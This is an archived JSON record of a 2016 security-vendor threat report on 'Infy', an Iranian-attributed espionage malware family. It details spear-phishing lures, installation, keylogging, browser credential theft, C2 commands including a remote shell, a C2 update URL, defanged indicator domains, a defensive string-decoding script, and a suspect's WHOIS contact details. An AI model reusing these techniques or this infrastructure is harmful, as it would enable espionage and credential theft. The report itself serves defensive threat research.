{
    "id": "edb76a9d-302a-4502-b1eb-ec6d25237122",
    "created_at": "2022-10-25T16:48:12.60495Z",
    "updated_at": "2025-03-27T02:11:55.120544Z",
    "deleted_at": null,
    "sha1_hash": "a5b61e0e469c7dcdb6e359c1a03d927f35c43bb8",
    "title": "Prince of Persia: Infy Malware Active In Decade of Targeted Attacks - Palo Alto Networks BlogPalo Alto Networks Blog",
    "authors": "",
    "file_creation_date": "2016-05-12T10:33:04Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 581734,
    "plain_text": "|Col1|POSTED BY: Tomer Bar and Simon Conant on May 2, 2016 5:00 AM|\n|---|---|\n|144||\n|LLiikkee|FILED IN: Malware, Threat Prevention, Unit 42 TAGGED: AutoFocus, Infy, microsoft, WildFire Attack campaigns that have very limited scope often remain hidden for years. If only a few malware samples are deployed, it’s less likely that security industry researchers will identify and connect them together.|\n|Tweet||\n|2||\n\n\n### 144\n\n\n**In May 2015, Palo Alto Networks WildFire detected two e-mails carrying malicious documents**\n\n**from a genuine and compromised Israeli Gmail account, sent to an Israeli industrial**\n\n**[organization. One e-mail carried a Microsoft PowerPoint file named “thanks.pps” (VirusTotal),](https://www.virustotal.com/en/file/a1d5ab7125f002262151e516151e9b9223b3f5ca3863d69dd8a12b066c162906/analysis/)**\n\n**the other a Microsoft Word document named “request.docx”.**\n\n**Around the same time, WildFire also captured an e-mail containing a Word document**\n\n**(“hello.docx”) with an identical hash as the earlier Word document, this time sent to a U.S.**\n\n**Government recipient.**\n\n**Based on various attributes of these files and the functionality of the malware they install, we**\n\n**have identified and collected over 40 variants of a previously unpublished malware family we**\n\n**call Infy, which has been involved in attacks stretching back to 2007. Attacks using this tool were**\n\n**still active as of April 2016.**\n\n**The attacks we have identified carrying Infy begin with a spear-phishing e-mail carrying a Word**\n\n**or PowerPoint document. The attached document file contains a multi-layer Self-Extracting**\n\n**Executable Archive (SFX), and content attempting to social engineer the recipient into activating**\n\n**the executable. In this example, the PPS file, when clicked, opens in “PowerPoint Show” mode.**\n\n**The user sees a PowerPoint page (Figure 1) that mimics a paused movie, and is tricked into**\n\n**clicking “Run” (Figure 2), which allows the embedded SFX file to execute.**\n\n**_Figure 1 PowerPoint page mimics a paused video_**\n\n**_Figure 2 User tricked into running embedded SFX EXE_**\n\n**One of the SFX layers is encrypted with the key “1qaz2wsx3edc”. The package (Figure 3)**\n\n\n## How the Financial Services Industry Can Prevent Ransomware\n\n**[posted by Lawrence Chin on May 11, 2016](http://researchcenter.paloaltonetworks.com/author/lawrence-chin/)**\n\n## Don’t Put Off Till Tomorrow What You Should Start Today (Part 2)\n\n**[posted by Greg Day on May 11, 2016](http://researchcenter.paloaltonetworks.com/author/greg-day/)**\n\n## Palo Alto Networks Joins Forces with the White House and Industry Partners to Support Veterans and their Families\n\n**[posted by John Davis on May 10, 2016](http://researchcenter.paloaltonetworks.com/author/john-davis/)**\n\n## Ransomware Is Not a “Malware Problem” – It's a Criminal Business Model\n\n**[posted by Ryan Olson on May 10, 2016](http://researchcenter.paloaltonetworks.com/author/ryan-olson/)**\n\n## VirusTotal Policy Changes Have No Impact On Palo Alto Networks Customers\n\n**[posted by Alfred Lee on May 9, 2016](http://researchcenter.paloaltonetworks.com/author/alfred/)**\n\n**[MORE →](http://researchcenter.paloaltonetworks.com/archives/)**\n\n\n**Select a Category**\n\n**Select a Month**\n\n**[MORE →](http://researchcenter.paloaltonetworks.com/archives/)**\n\n\n## 2\n\n\n-----\n\n**up to 3 characters (early versions used a .cpl extension).**\n\n**_Figure 3 Embedded SFX contents_**\n\n**_Figure 4 Some campaigns include image or video files as camouflage_**\n\n**The executable installs the DLL, writes to the autorun registry key, and doesn’t activate until a**\n\n**reboot. After reboot, it first checks for antivirus and then connects to the C2. It starts collecting**\n\n**environment data, initiates a keylogger, and steals browser passwords and content such as**\n\n**cookies, before exfiltrating the stolen data to the C2 server.**\n\n**The initially-observed “thanks.pps” example tricks the user into running the embedded file**\n\n**named ins8376.exe which loads a payload DLL named mpro324.dll.**\n\n**In our initial samples, we observed C2 servers updateserver3[.]com and us1s2[.]strangled[.]net.**\n\n**Other campaigns use a combination of Dynamic DNS providers, third-party site hosting**\n\n**services, and apparently first-party-registered domains as C2 servers.**\n\n**Analysis of hosting and WHOIS data (Figure 5) led to a total of 12 related first-party-registered**\n\n**domains used for C2 servers:**\n\n**bestbox3[.]com**\n\n**myblog2000[.]com**\n\n**safehostonline[.]com**\n\n**updateserver3[.]com**\n\n**short-name[.]com**\n\n**bestupdateserver2[.]com**\n\n**bestwebstat[.]com**\n\n**updatebox4[.]com**\n\n**bestupdateserver[.]com**\n\n**short-url20[.]com**\n\n**updateserver1[.]com**\n\n**box4054[.]net**\n\n**Ages of these domains suggest that some may have been used for malicious activity back as far**\n\n**as early 2010.**\n\n**[We found a report by the Danish Defense Intelligence Service’s Center for Cybersecurity, which](https://fe-ddis.dk/cfcs/CFCSDocuments/Phishing uden fangst.pdf)**\n\n**had observed similar attacks against Danish Government targets, and documented a small**\n\n**portion of the same C2 infrastructure.**\n\n\n-----\n\n**_Figure 5 Infrastructure and Actor information related to Infy Attacks_**\n\n**We initially found a file with an identical hash as the originally-observed PowerPoint file, but a**\n\n**different filename (“syria.pps”), uploaded to VirusTotal (Figure 6) also in May of 2015. A**\n\n**characteristic observed across these campaigns is that the actor puts deliberate effort into the**\n\n**specific geographic targeting, with region-specific attack content.**\n\n**_Figure 6 Powerpoint file uploaded to VirusTotal with a different file name_**\n\n**We were subsequently able to pivot and associate additional malware and campaigns based on**\n\n**infrastructure, hashes, strings, and payload links and similarities. The most conclusive evidence**\n\n**that all of these are linked is found in a single key, used to encode strings within the malware**\n\n**across all examples. Only the offset varies: older versions encode just the C2 data, newer**\n\n**versions encode most strings, and some double-encode the C2 data with two different offsets.**\n\n**The following script can be used to decode these strings:**\n\n\n**1**\n**2**\n**3**\n**4**\n**5**\n**6**\n**7**\n**8**\n**9**\n**10**\n**11**\n**12**\n**13**\n**14**\n**15**\n**16**\n\n\n**import string**\n**import base64**\n**FIRST_PHASE = \"OQTJEqtsK0AUB9YXMwr8idozF7VWRPpnhNCHI6Dlkaubyxf5423j**\n**SECOND_PHASE = \"\" + \"PqOwI1eUrYtT2yR3p4E5o6WiQu7ASlDkFj8GhHaJ9sKdLf**\n**def decrypt(input, offset=-10):**\n**result = \"\"**\n**for** **i,** **c** **in** **enumerate(input):**\n**i = i % 62 + 1**\n**try:**\n**index = FIRST_PHASE.index(c)**\n**except ValueError:**\n**result += c**\n**continue**\n**translated = SECOND_PHASE[(index - i + offset) % len(SECOND_PHA**\n**result += translated**\n**return** **result**\n\n\n**Based on this specific encoding technique and key, we have identified related Infy samples from**\n\n\n-----\n\n**Over the years, we notice continued development and feature improvement in the code. For**\n\n**instance, support for the new Microsoft Edge browser was recently introduced in “version 30”.**\n\n**_Figure 7 Oldest related example found dates to 2007_**\n\n**Most of the associated malware samples dating back over the last five years were eventually**\n\n**detected by antivirus programs, but in most cases with a generic signature. Other examples are**\n\n**named with multiple unrelated signature classifications, including Win32/Tuax.A (very old**\n\n**versions), W32/ADOKOOB, Win32/Cloptern.A & B (old versions), TR/Graftor.106254,**\n\n**TR/Spy.Arpnatis.A, and Win32/Skeeyah.A!bit.**\n\n**We refer to the malware as “Infy” because the actor used this string in multiple locations,**\n\n**including filenames (“infy74f1.exe” – Infy version 7.4 F1), C2 strings (“subject=INFY M 7.8”), and**\n\n**C2 folder names.**\n\n**The Gmail account sending the emails in the attack that we first observed (Figure 8), belongs to**\n\n**an Israeli victim. That account was itself victim of an e-mail-borne attack that compromised the**\n\n**user’s system and e-mail account.**\n\n**_Figure 8 First-observed attack, via email_**\n\n**Among WHOIS records for first-party domains used in the C2 infrastructure, we find three email**\n\n**accounts bearing a strong similarity in naming pattern:**\n\n**The WHOIS records with the first two email addresses (and other C2 domains) have apparently**\n\n**fake WHOIS content. The “aminjalali_58 (at) yahoo.com” email address is associated with 6**\n\n**known C2 domains, dating back to 2010. Unlike the fake WHOIS examples, this example has**\n\n**content more consistent with the email address:**\n\n**_amin jalali_**\n\n**_safehostonline_**\n\n**_afriqa street number 68_**\n\n**_tehran_**\n\n**_Tehran_**\n\n**_19699_**\n\n**_IR_**\n\n**_+98.935354252_**\n\n**_aminjalali_58 (at) yahoo.com_**\n\n**The name “Amin Jalali” is not unique, though it does appear to have Iranian-specific origins. We**\n\n**find profiles and artifacts combining the name and “58”, which may (or may not) be the same**\n\n**individual, and all of which have Iranian links.**\n\n**When we look at domains on neighboring IP addresses from known first-party C2s, we observe**\n\n**numerous Iranian domains, suggesting possibly an Iranian hosting reseller – and in at least one**\n\n**case, a free Iranian web host (Figure 9).**\n\n\n-----\n\n**_Figure 9 Neighbor IP addresses with Iranian domains_**\n\n**We have enough evidence to conclude a pattern of behavior following extensive analysis of this**\n\n**malware and C2 infrastructure between these samples. The activity has been observed over**\n\n**almost 10 years, with the malware being constantly improved and developed. The low-volume**\n\n**of activity, deliberate campaign focus and content tailoring, and nature of targets hints at the**\n\n**goals of this actor.**\n\n**We believe that we have uncovered a decade-long operation that has successfully stayed under**\n\n**the radar for most of its existence as targeted espionage originating from Iran. It is aimed at**\n\n**governments and businesses of multiple nations as well as its own citizens.**\n\n**Palo Alto Networks customers are protected from this threat in the following ways:**\n\n**1. WildFire accurately identifies all malware samples related to this operation as malicious.**\n\n**2. Domains used by this operation have been flagged as malicious in Threat Prevention.**\n\n**3. AutoFocus users can view malware related to this attack using the “Infy tag.**\n\n**IOCs can be found in the appendices of this report.**\n\n**Special thanks to Michael Scott for assistance with Maltego in this investigation.**\n\n**Although Infy is fundamentally one malware family, we observe two distinct variants. The**\n\n**regular variant “Infy” is versioned by the malware author 1-30 (1999 -15999 sub-versions). In**\n\n**addition, we observe a distinct variant “Infy M” developed in parallel with the regular variant**\n\n**since about 2013. Infy M appears to be a full featured variant, deployed against high-value**\n\n**targets. It includes more functionality: while the original variant has no remote control, “M” adds**\n\n**the ability for the C2 to issue commands to the malware via C2 PHP scripts; HTTP support; a**\n\n**hidden GUI control panel; and FTP client.**\n\n**Detailed analysis of a recent Infy sample (version 30, active from 24 February 2016):**\n\n**The initial executable first checks for installed antivirus programs. It uses the Windows API**\n\n**function “GetFileattributeA” on a list of several common AV installation directories, testing any**\n\n**positive return with “file_attribute_directory”. Depending on which AV Infy finds, it will either**\n\n**abort, or install the malicious Infy DLL using a different technique. This concern with avoiding**\n\n**client-AV detection, skipping installation rather than risk alerting, is somewhat noteworthy (as**\n\n**opposed to the relatively common sandbox-detection techniques). The EXE installs the DLL,**\n\n**writes to the autorun key, and does nothing else until restart.**\n\n**Upon restart, the EXE loader executes the main function, exported by the DLL malware file DLL**\n\n**(previously we observed functions named “start1/start2/start3”) with the parameter /rcv (this**\n\n**version uses a decryption offset of 19). It installs itself in “cyberlink” directory.**\n\n**It will then search for files with “bak”, “csv”, or “cnt”, extensions. If the parameter “/rcv” was**\n\n**used, it starts a keylogger (the keylogger uses a window name “TRON2VDLLB”**\n\n**(GetMessageA/translate message/DispatchMessageA). It next registers hotkeys, and gets**\n\n**clipboard data. Get_browser_data steals passwords, forms, cookies, history (from Microsoft**\n\n**Edge, Internet Explorer, Google Chrome, Opera, and Firefox).**\n\n**The malware connects to the C2 every five minutes using HTTP, posting:**\n\n**<computer name>**\n\n**<user name>**\n\n**dn = n1**\n\n**ver = 30**\n\n**lfolder= f**\n\n\n-----\n\n**After posting data about the infected system to the C2 server, the malware downloaded an**\n\n**update named “v30nXf1.tmp” file to %temp%\\drvtem64.tmp. If the download is successful, the**\n\n**malware writes “OK, Downloaded [url file]” to log file. It then connects again, with a similar**\n\n**posting format, but this time also adding “tt=” (time) and “cpuid=”. It installs the downloaded file**\n\n**with parameter “-sp/ins -pBA5a88E”. A third connection adds “sfolder”, “subject”, and this time**\n\n**exfiltrates data in the “body=” parameter.**\n\n**Each variant of Infy uses specific “cover” camouflage to with file metadata that makes it appear**\n\n**as though it is legitimate software. In this case, the file used the software name “Cyberlink,” and**\n\n**a description of “CLMediaLibrary Dynamic Link Library” and listing version 4.19.9.98.**\n\n**We observed the Infy M variant with versions 6.1 through 7.8, adding features including screen**\n\n**capture, document capture & upload, and microphone capture. Infy M supports the following C2**\n\n**commands:**\n\n**ASIDLE – idle**\n\n**ASDIR – directory list of files**\n\n**ASPUT – download file**\n\n**ASGET – upload file**\n\n**ASZIPGET – upload as zip**\n\n**ASDELETE – delete file**\n\n**ASRENAME – rename file**\n\n**ASRUN – execute file**\n\n**ASENDTASK – terminate process**\n\n**ASZIP – zip file**\n\n**ASSHELL – remote shell**\n\n**The “M” variant uses mostly distinct C2 servers from the regular Infy samples (although very**\n\n**recently, we also observed version 7.8 using C2 “youripinfo.com”, previously seen as C2 for the**\n\n**regular variant):**\n\n**bestupdateserver[.]com – Observed 2013-12-09**\n\n**www.bestupdateserver[.]com – Observed 2013-04-26**\n\n**bestbox3[.]com – Observed 2015-08-25**\n\n**www.bestupdateserver2[.]com – Observed 2015-05-22**\n\n**bestupdateserver2[.]com – Observed 2014-07-16**\n\n**Versions 6.x of the Infy M variant camouflage themselves with file and window names set to**\n\n**Borland hcrtf. They use a single EXE, rather than a loader EXE and payload DLL as seen in the**\n\n**original variant. The malware initially performs a check to see if the victim as already infected by**\n\n**checking for window names “Borland hcrtf 6.x” or “Macromedia Swsoc 7.x”.**\n\n**We have identified five hidden GUI control forms in Infy M, one of which is not used. The first**\n\n**form includes three possible parameters. Parameter “/ins” installs the Trojan. It first creates and**\n\n**starts the service and on Windows versions prior to Vista it requires the “/s” parameter. After**\n\n**installing itself, the malware deletes any previous Infy installations. The does this by terminating**\n\n**processes and deleting Infy files in %system32%, %appdata%, %appdata%\\hcrtf (for example,**\n\n**pre-6.1 files incsy32.exe, incs32.exe, ntvdn.exe, grep.exe, hcrtf.exe, grep.dll). It then renames**\n\n**the ini file from grepc.ini to hcrtfc.ini. It completes clean-up by deleting the “inverse Ser32”,**\n\n**“grep”, and “hcrtf” services. Finally, it downloads and executes the update file from the C2 at**\n\n**/infy/update.php.**\n\n**The /c (copy) parameter sets up autostart for the malware by writing to registry key “run”**\n\n**(Windows Vista and above) or “runservices” (versions prior to Windows Vista). The /s (service)**\n\n**parameter creates and starts the service (Windows Vista and later). At this point, the malware**\n\n**waits, and handles any commands issued over HTTP from the C2 (for example, execute a**\n\n**remote shell upon receiving command “ASSHELL”).**\n\n**The second form monitors for new or modified document files using “CreateIoCompletionPort”**\n\n**and “ReadDirectoryChangesW”. It targets document file types .doc, .xls, .jpg, .jpe, .txt, .htm,**\n\n**.pgp, .pdf, .zip, and .rar and ZIP compresses them (using the password “Z8(2000_2001uI”) into**\n\n**a file located at \\Program Files\\Yahoo!\\Messenger\\Profiles\\yfsbg\\yfsbg\\3dksf.tmp.**\n\n**The third form takes a screen captures and stores it the “yfsbg” folder as 4dksf.tmp. It the**\n\n**uploads the screenshot and document-capture files using POST (instead of using GET as seen**\n\n**in the regular variants) to <C2 server>/infy/fms.php.**\n\n**The fourth form is not used. The fifth form is used for microphone capture.**\n\n**The 7 x versions install themselves as swsoc exe (7 4 also seen using infy74f1 exe) at**\n\n\n-----\n\n**“Z8(2000_2001uI”.**\n\n**We observed a server reply with error in the PHP, giving us some of their underlying file**\n\n**structure:**\n\n**<b>Warning</b>: Cannot modify header information – headers already sent by (output started**\n\n**at /home/bestupda/public_html/infy/fms.php:115) in**\n\n**<b>/home/bestupda/public_html/infy/fms.php</b> on line <b>116</b><br />**\n\n**Upgrade requests are observed with this syntax (here, version 6.2 to the latest version):**\n\n**http://www.bestupdateserver.com/infy/update.php?cn=<computername>&ver=6.2&u=27/3/2016**\n\n**20:37:23**\n\n**[A list of hashes for associated files observed in this operation can be found here.](https://github.com/pan-unit42/iocs/blob/master/prince_of_persia/hashes.csv)**\n\n**analyse1[.]mooo[.]com**\n\n**best[.]short-name[.]com**\n\n**best2[.]short-name[.]com**\n\n**best2[.]short-url20[.]com**\n\n**best3[.]short-url20[.]com**\n\n**best4[.]short-url20[.]com**\n\n**best5[.]short-url20[.]com**\n\n**best6[.]short-url20[.]com**\n\n**best7[.]short-url20[.]com**\n\n**bestbox3[.]com**\n\n**bestupdateserver[.]com**\n\n**bestupdateserver2[.]com**\n\n**bestupser[.]awardspace[.]info**\n\n**bestwebstat[.]com**\n\n**bl2pe[.]bestwebstat[.]com**\n\n**box4054[.]net**\n\n**c1[.]short-url20[.]com**\n\n**dbook[.]soon[.]it**\n\n**dsite[.]dyx[.]comextd[.]mine[.]bz**\n\n**fastecs[.]netfirms[.]com**\n\n**fastupdate[.]net**\n\n**gstat[.]strangled[.]net**\n\n**lost[.]updateserver1[.]com**\n\n**lu[.]ige[.]es**\n\n**mand[.]pwnz[.]org**\n\n**myblog2000[.]com**\n\n**ns2[.]myblog2000[.]com**\n\n**nus[.]soon[.]it**\n\n**safehostonline[.]com**\n\n**secup[.]soon[.]it**\n\n**short-name[.]com**\n\n**short-url20[.]com**\n\n**update[.]info[.]gf**\n\n**updatebox4[.]com**\n\n**updateserver1[.]com**\n\n**updateserver3[.]com**\n\n**us1[.]short-name[.]com**\n\n**us12[.]short-url20[.]com**\n\n**us13[.]short-url20[.]com**\n\n**us15[.]short-url20[.]com**\n\n**us16[.]short-url20[.]com**\n\n**us1s2[.]strangled[.]net**\n\n**wep[.]archvisio[.]com**\n\n**wep[.]soon[.]it**\n\n**wpstat[.]mine[.]bz**\n\n**wpstat[.]strangled[.]net**\n\n**www[.]fastupdate[.]net**\n\n**www[.]updateserver1[.]com**\n\n**youripinfo[.]com**\n\n\n-----\n\n## Share your thoughts\n\n\n**nice catch!**\n\n|Col1|laplinker on May 2, 2016 8:42 AM said|\n|---|---|\n||nice catch!|\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2016/2016.05.02.Prince_of_Persia_Infy_Malware/prince-of-persia-infy-malware-active-in-decade-of-targeted-attacks.pdf"
    ],
    "report_names": [
        "prince-of-persia-infy-malware-active-in-decade-of-targeted-attacks"
    ],
    "threat_actors": [
        {
            "id": "59c9f31b-e032-44b9-bf3b-4f2cb3d17e39",
            "created_at": "2022-10-25T16:07:23.734244Z",
            "updated_at": "2025-03-27T02:02:09.952685Z",
            "deleted_at": null,
            "main_name": "Infy",
            "aliases": [
                "APT-C-07",
                "Infy",
                "Operation Mermaid",
                "Prince of Persia"
            ],
            "source_name": "ETDA:Infy",
            "tools": [
                "Foudre",
                "Infy",
                "Tonnerre"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f763fd1f-f697-40eb-a082-df6fd3d13cb1",
            "created_at": "2023-01-06T13:46:38.561288Z",
            "updated_at": "2025-03-27T02:00:02.861874Z",
            "deleted_at": null,
            "main_name": "Infy",
            "aliases": [
                "Operation Mermaid",
                "Prince of Persia",
                "Foudre"
            ],
            "source_name": "MISPGALAXY:Infy",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1666716492,
    "ts_updated_at": 1743041515,
    "ts_creation_date": 1463049184,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/a5b61e0e469c7dcdb6e359c1a03d927f35c43bb8.pdf",
        "text": "https://archive.orkl.eu/a5b61e0e469c7dcdb6e359c1a03d927f35c43bb8.txt",
        "img": "https://archive.orkl.eu/a5b61e0e469c7dcdb6e359c1a03d927f35c43bb8.jpg"
    }
}